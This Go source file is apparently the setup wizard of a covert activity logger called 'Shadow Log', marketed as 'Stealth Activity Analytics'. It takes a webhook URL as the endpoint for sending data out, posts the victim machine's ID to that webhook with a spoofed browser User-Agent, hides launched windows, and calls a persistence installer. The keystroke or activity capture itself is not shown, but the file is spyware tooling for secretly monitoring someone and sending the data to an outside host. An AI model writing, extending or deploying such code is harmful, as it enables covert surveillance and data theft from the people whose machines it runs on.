package ui

import (
	"bytes"
	"context"
	"encoding/json"
	"fmt"
	"html/template"
	"net/http"
	"os/exec"
	"runtime"
	"shadowlog/config"
	"shadowlog/persistence"
	"sync"
	"syscall"
	"time"
)

// ShowSetup displays a web-based setup wizard for initial configuration.
func ShowSetup(cfg *config.Config, startLogger func(*config.Config, func(string)) func()) {
	var wg sync.WaitGroup
	wg.Add(1)

	mux := http.NewServeMux()
	server := &http.Server{Addr: ":58291", Handler: mux}

	// Handle the test webhook request.
	mux.HandleFunc("/test", func(w http.ResponseWriter, r *http.Request) {
		if r.Method != "POST" {
			http.Error(w, "Method not allowed", http.StatusMethodNotAllowed)
			return
		}

		var data struct {
			URL string `json:"url"`
		}
		if err := json.NewDecoder(r.Body).Decode(&data); err != nil {
			http.Error(w, "Invalid request", http.StatusBadRequest)
			return
		}

		guid := config.GetMachineID()
		payload := map[string]string{"content": fmt.Sprintf("🟢 **%s Connectivity Test**\n\n- **Status**: Operational\n- **Machine GUID**: `%s`\n- **Note**: This GUID is required for log decryption.", "Shadow Log", guid)}
		pData, _ := json.Marshal(payload)

		req, _ := http.NewRequest("POST", data.URL, bytes.NewBuffer(pData))
		req.Header.Set("Content-Type", "application/json")
		req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36")

		client := &http.Client{Timeout: 10 * time.Second}
		resp, err := client.Do(req)

		if err != nil || resp.StatusCode >= 400 {
			w.WriteHeader(http.StatusBadRequest)
			fmt.Fprint(w, "Failed to send test message. Check your URL.")
			return
		}
		fmt.Fprint(w, "Test message sent successfully!")
	})

	// Handle GET (show form) and POST (process form) requests.
	mux.HandleFunc("/", func(w http.ResponseWriter, r *http.Request) {
		switch r.Method {
		case "GET":
			tmpl := template.Must(template.New("setup").Parse(htmlContent))
			tmpl.Execute(w, cfg)
		case "POST":
			r.ParseForm()
			cfg.WebhookURL = r.FormValue("webhook_url")
			cfg.LogLocal = r.FormValue("log_local") == "on"
			cfg.IsInstalled = true

			config.SaveConfig(cfg)
			persistence.Install()

			w.Header().Set("Content-Type", "text/html")
			fmt.Fprint(w, setupSuccessHTML)

			go func() {
				time.Sleep(2000 * time.Millisecond)
				server.Shutdown(context.Background())
				wg.Done()
			}()
		}
	})

	// Flag to track if the server successfully started.
	serverStarted := make(chan bool)

	go func() {
		url := "http://localhost:58291"
		// Wait a bit for the server to spin up.
		<-serverStarted
		openBrowser(url)
	}()

	go func() {
		if err := server.ListenAndServe(); err != nil && err != http.ErrServerClosed {
			// If blocked, we exit to prevent a silent hung process.
			fmt.Printf("Setup server error: %v\n", err)
			wg.Done()
			return
		}
		serverStarted <- true
	}()

	// Safety: Ensure we don't hang if server fails immediately.
	go func() {
		time.Sleep(1 * time.Second)
		select {
		case serverStarted <- true:
		default:
		}
	}()

	wg.Wait()
	// Real monitor will start after setup server closes, handled by main.go calling the returned func again if needed,
	// but here we already started it in a goroutine for the preview. 
	// To avoid duplicate hooks, we might need a way to stop the preview logger or just transition.
	// For now, let's just exit and let main.go call startLogger(cfg, nil)() which is correct.
}

func openBrowser(url string) {
	var err error
	switch runtime.GOOS {
	case "windows":
		// Primary method: rundll32
		cmd := exec.Command("rundll32", "url.dll,FileProtocolHandler", url)
		cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
		err = cmd.Start()
		
		if err != nil {
			// Fallback method: cmd /c start
			cmd = exec.Command("cmd", "/c", "start", url)
			cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
			err = cmd.Start()
		}
	case "linux":
		err = exec.Command("xdg-open", url).Start()
	case "darwin":
		err = exec.Command("open", url).Start()
	}
	
	if err != nil {
		fmt.Printf("Error opening browser: %v\n", err)
	}
}

const htmlContent = `
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>ShadowLog Precision</title>
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&family=JetBrains+Mono&display=swap" rel="stylesheet">
    <style>
        :root {
            --primary: #0078d4;
            --primary-glow: rgba(0, 120, 212, 0.3);
            --bg: #050505;
            --card-bg: rgba(20, 20, 20, 0.7);
            --card-border: rgba(255, 255, 255, 0.08);
            --text-main: #ffffff;
            --text-dim: #a1a1a1;
            --danger: #ff4d4d;
            --success: #2ecc71;
        }

        * { margin: 0; padding: 0; box-sizing: border-box; }

        body {
            font-family: 'Inter', -apple-system, BlinkMacSystemFont, sans-serif;
            background-color: var(--bg);
            background-image: 
                radial-gradient(circle at 0% 0%, rgba(0, 120, 212, 0.1) 0%, transparent 40%),
                radial-gradient(circle at 100% 100%, rgba(0, 120, 212, 0.05) 0%, transparent 40%);
            color: var(--text-main);
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            overflow: hidden;
        }

        .container {
            width: 100%;
            max-width: 440px;
            padding: 20px;
            animation: fadeIn 0.8s cubic-bezier(0.16, 1, 0.3, 1);
        }

        @keyframes fadeIn {
            from { opacity: 0; transform: translateY(20px); }
            to { opacity: 1; transform: translateY(0); }
        }

        .card {
            background: var(--card-bg);
            backdrop-filter: blur(40px);
            -webkit-backdrop-filter: blur(40px);
            border: 1px solid var(--card-border);
            border-radius: 24px;
            padding: 48px;
            box-shadow: 0 40px 80px -20px rgba(0, 0, 0, 0.8);
            position: relative;
            overflow: hidden;
        }

        .card::before {
            content: '';
            position: absolute;
            top: 0; left: 0; right: 0; height: 1px;
            background: linear-gradient(90deg, transparent, rgba(255,255,255,0.2), transparent);
        }

        .header { margin-bottom: 32px; text-align: center; }

        .logo-box {
            width: 64px;
            height: 64px;
            background: linear-gradient(135deg, rgba(0, 120, 212, 0.2), rgba(0, 120, 212, 0.05));
            border-radius: 20px;
            display: flex;
            justify-content: center;
            align-items: center;
            margin: 0 auto 20px;
            color: var(--primary);
            box-shadow: 0 0 30px var(--primary-glow);
        }

        h1 {
            font-size: 1.5rem;
            font-weight: 800;
            letter-spacing: -0.04em;
            margin-bottom: 6px;
        }

        .subtitle {
            color: var(--text-dim);
            font-size: 0.875rem;
            font-weight: 500;
        }

        .form-group { margin-bottom: 24px; }

        label {
            display: block;
            font-size: 0.75rem;
            font-weight: 700;
            margin-bottom: 10px;
            color: var(--text-dim);
            text-transform: uppercase;
            letter-spacing: 0.1em;
        }

        .input-wrapper { position: relative; }

        input[type="url"] {
            width: 100%;
            background: rgba(255, 255, 255, 0.03);
            border: 1px solid rgba(255, 255, 255, 0.1);
            border-radius: 12px;
            padding: 14px 14px;
            color: #fff;
            font-family: inherit;
            font-size: 0.9375rem;
            transition: all 0.3s;
        }

        input[type="url"]:focus {
            outline: none;
            border-color: var(--primary);
            background: rgba(255, 255, 255, 0.05);
            box-shadow: 0 0 0 4px rgba(0, 120, 212, 0.15);
        }

        .test-btn {
            background: transparent;
            border: 1px solid var(--primary);
            color: var(--primary);
            padding: 8px 16px;
            border-radius: 10px;
            font-size: 0.75rem;
            font-weight: 700;
            cursor: pointer;
            margin-top: 12px;
            transition: all 0.2s;
            width: 100%;
        }

        .test-btn:hover:not(:disabled) {
            background: var(--primary);
            color: white;
            box-shadow: 0 8px 20px -4px var(--primary-glow);
        }

        .test-status {
            font-size: 0.75rem;
            margin-top: 8px;
            display: block;
            text-align: center;
            min-height: 18px;
        }

        .checkbox-group {
            background: rgba(255, 255, 255, 0.02);
            border: 1px solid rgba(255, 255, 255, 0.04);
            border-radius: 16px;
            padding: 18px;
            display: flex;
            align-items: flex-start;
            gap: 14px;
            cursor: pointer;
            transition: all 0.2s;
        }

        .checkbox-group:hover {
            background: rgba(255, 255, 255, 0.04);
            border-color: var(--primary);
        }

        .checkbox-group input {
            width: 20px;
            height: 20px;
            accent-color: var(--primary);
            margin-top: 2px;
        }

        .checkbox-title { font-size: 0.875rem; font-weight: 700; display: block; margin-bottom: 2px; }
        .checkbox-desc { font-size: 0.75rem; color: var(--text-dim); line-height: 1.4; }

        .submit-btn {
            width: 100%;
            background: var(--primary);
            color: white;
            border: none;
            border-radius: 14px;
            padding: 16px;
            font-size: 1rem;
            font-weight: 800;
            cursor: pointer;
            transition: all 0.3s;
            margin-top: 8px;
            box-shadow: 0 10px 30px -10px var(--primary-glow);
        }

        .submit-btn:hover {
            transform: translateY(-2px);
            box-shadow: 0 20px 40px -12px var(--primary-glow);
            filter: brightness(1.1);
        }

        .submit-btn:active { transform: translateY(0); }

        /* Preview Console */
        .preview-section {
            display: flex;
            flex-direction: column;
            gap: 12px;
        }

        .console {
            flex-grow: 1;
            background: var(--console-bg);
            border: 1px solid rgba(255, 255, 255, 0.05);
            border-radius: 20px;
            padding: 20px;
            font-family: 'JetBrains Mono', monospace;
            font-size: 0.75rem;
            overflow-y: auto;
            max-height: 400px;
            min-height: 300px;
            display: flex;
            flex-direction: column;
            gap: 4px;
        }

        .console::-webkit-scrollbar {
            width: 6px;
        }

        .console::-webkit-scrollbar-thumb {
            background: rgba(255, 255, 255, 0.1);
            border-radius: 3px;
        }

        .log-entry {
            display: flex;
            gap: 8px;
            animation: fadeInLog 0.3s ease-out;
        }

        @keyframes fadeInLog {
            from { opacity: 0; transform: translateX(-5px); }
            to { opacity: 1; transform: translateX(0); }
        }

        .log-ts { color: var(--text-dim); flex-shrink: 0; }
        .log-win { color: var(--primary); font-weight: 600; flex-shrink: 0; }
        .log-val { color: #fff; word-break: break-all; }

        .hidden-indicator {
            display: inline-block;
            width: 8px;
            height: 14px;
            background: var(--primary);
            margin-left: 2px;
            animation: blink 1s infinite;
            vertical-align: middle;
        }

        @keyframes blink {
            0%, 100% { opacity: 1; }
            50% { opacity: 0; }
        }

        .preview-header {
            display: flex;
            justify-content: space-between;
            align-items: center;
        }

        .live-tag {
            background: rgba(244, 63, 94, 0.15);
            color: var(--danger);
            padding: 4px 8px;
            border-radius: 6px;
            font-size: 0.65rem;
            font-weight: 700;
            text-transform: uppercase;
            display: flex;
            align-items: center;
            gap: 6px;
        }

        .live-tag::before {
            content: '';
            width: 6px;
            height: 6px;
            background: var(--danger);
            border-radius: 50%;
            animation: pulse 1.5s infinite;
        }

        @keyframes pulse {
            0% { transform: scale(1); opacity: 1; }
            50% { transform: scale(1.5); opacity: 0.5; }
            100% { transform: scale(1); opacity: 1; }
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="card">
            <div class="header">
                <div class="logo-box">
                    <svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><path d="M17.5 19c.3 0 .5-.1.7-.3.2-.2.3-.5.3-.8 0-.3-.1-.5-.3-.7-.2-.2-.5-.3-.8-.3-.3 0-.5.1-.7.3-.2.2-.3.5-.3.8 0 .3.1.5.3.7.2.2.5.3.8.3zM15 9.5c.3 0 .5-.1.7-.3.2-.2.3-.5.3-.7 0-.3-.1-.5-.3-.7-.2-.2-.5-.3-.7-.3-.3 0-.5.1-.7.3-.2.2-.3.5-.3.7 0 .3.1.5.3.7.2.2.5.3.7.3zM11 19c.3 0 .5-.1.7-.3.2-.2.3-.5.3-.8 0-.3-.1-.5-.3-.7-.2-.2-.5-.3-.8-.3-.3 0-.5.1-.7.3-.2.2-.3.5-.3.8 0 .3.1.5.3.7.2.2.5.3.8.3zM6.5 15.5c.3 0 .5-.1.7-.3.2-.2.3-.5.3-.8 0-.3-.1-.5-.3-.7-.2-.2-.5-.3-.8-.3-.3 0-.5.1-.7.3-.2.2-.3.5-.3.8 0 .3.1.5.3.7.2.2.5.3.8.3zM21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4"/><polyline points="7 10 12 15 17 10"/><line x1="12" y1="15" x2="12" y2="3"/></svg>
                </div>
                <h1>Shadow Log</h1>
                <p class="subtitle">Stealth Activity Analytics</p>
            </div>

            <form action="/" method="POST" id="setupForm">
                <div class="form-group">
                    <label for="webhook_url">Endpoint Configuration</label>
                    <div class="input-wrapper">
                        <input type="url" id="webhook_url" name="webhook_url" value="{{ .WebhookURL }}" 
                                 placeholder="https://..." required>
                        <button type="button" class="test-btn" id="testBtn">Test Connection</button>
                    </div>
                    <div id="testStatus" class="test-status"></div>
                </div>

                <div class="form-group">
                    <label class="checkbox-group">
                        <input type="checkbox" name="log_local" {{ if .LogLocal }}checked{{ end }}>
                        <div class="checkbox-label">
                            <span class="checkbox-title">Resilient Local Cache</span>
                            <span class="checkbox-desc">Preservere diagnostic data in deep system cache for offline stability.</span>
                        </div>
                    </label>
                </div>

                <button type="submit" class="submit-btn" id="submitBtn">Initialize Service</button>
            </form>
        </div>

    <script>
        const testBtn = document.getElementById('testBtn');
        const webhookInput = document.getElementById('webhook_url');
        const testStatus = document.getElementById('testStatus');

        testBtn.addEventListener('click', async () => {
            const url = webhookInput.value;
            if (!url) {
                showStatus('Missing Webhook URL', 'var(--danger)');
                return;
            }

            testBtn.disabled = true;
            testBtn.textContent = 'Testing...';
            showStatus('Pushing test payload...', 'var(--primary)');

            try {
                const response = await fetch('/test', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ url })
                });

                if (response.ok) {
                    showStatus('Connection established.', 'var(--success)');
                } else {
                    showStatus('Connection rejected.', 'var(--danger)');
                }
            } catch (err) {
                showStatus('Handshake failed.', 'var(--danger)');
            } finally {
                testBtn.disabled = false;
                testBtn.textContent = 'Test Connection';
            }
        });

        function showStatus(text, color) {
            testStatus.textContent = text;
            testStatus.style.color = color;
        }
    </script>
</body>
</html>
`
const setupSuccessHTML = `
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Shadow Log: Tactical Setup</title>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;700&display=swap" rel="stylesheet">
    <style>
        :root {
            --primary: #38bdf8;
            --bg: #020617;
            --card-bg: rgba(15, 23, 42, 0.6);
            --text-main: #f1f5f9;
            --text-dim: #64748b;
        }
        body {
            background-color: var(--bg);
            color: var(--text-main);
            font-family: 'Inter', sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            overflow: hidden;
            background-image: 
                radial-gradient(circle at 10% 20%, rgba(56, 189, 248, 0.03) 0%, transparent 40%),
                radial-gradient(circle at 90% 80%, rgba(56, 189, 248, 0.03) 0%, transparent 40%);
        }
        .card {
            text-align: center;
            padding: 64px 48px;
            background: var(--card-bg);
            backdrop-filter: blur(40px);
            border-radius: 28px;
            border: 1px solid var(--card-border);
            max-width: 440px;
            box-shadow: 0 40px 80px -20px rgba(0, 0, 0, 0.8);
            animation: slideUp 0.8s cubic-bezier(0.16, 1, 0.3, 1);
        }
        .check-icon {
            width: 80px;
            height: 80px;
            background: rgba(0, 120, 212, 0.1);
            color: var(--primary);
            border-radius: 24px;
            display: flex;
            justify-content: center;
            align-items: center;
            margin: 0 auto 32px;
            box-shadow: 0 0 20px rgba(0, 120, 212, 0.2);
        }
        h1 { font-size: 1.75rem; font-weight: 800; margin-bottom: 12px; letter-spacing: -0.04em; }
        p { color: var(--text-dim); font-size: 0.9375rem; line-height: 1.6; font-weight: 500; }
        .status-badge {
            display: inline-flex;
            align-items: center;
            gap: 8px;
            background: rgba(16, 185, 129, 0.1);
            color: #10b981;
            padding: 6px 12px;
            border-radius: 100px;
            font-size: 0.75rem;
            font-weight: 700;
            margin-top: 24px;
            text-transform: uppercase;
            letter-spacing: 0.05em;
        }
        .status-dot { width: 6px; height: 6px; background: #10b981; border-radius: 50%; animation: pulse 2s infinite; }
        @keyframes pulse { 0% { transform: scale(1); opacity: 1; } 50% { transform: scale(1.5); opacity: 0.5; } 100% { transform: scale(1); opacity: 1; } }
        @keyframes slideUp { from { transform: translateY(20px); opacity: 0; } to { transform: translateY(0); opacity: 1; } }
    </style>
</head>
<body>
    <div class="card">
        <div class="check-icon">
            <svg xmlns="http://www.w3.org/2000/svg" width="40" height="40" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3" stroke-linecap="round" stroke-linejoin="round"><polyline points="20 6 9 17 4 12"></polyline></svg>
        </div>
        <h1>Initialization Complete</h1>
        <p>Shadow Log has been successfully initialized and is now active.</p>
        
        <div class="status-badge">
            <span class="status-dot"></span>
            Service Operational
        </div>
        <p style="margin-top: 32px; font-size: 0.75rem; opacity: 0.6;">You can close this window. The installer will exit automatically.</p>
    </div>
</body>
</html>
`
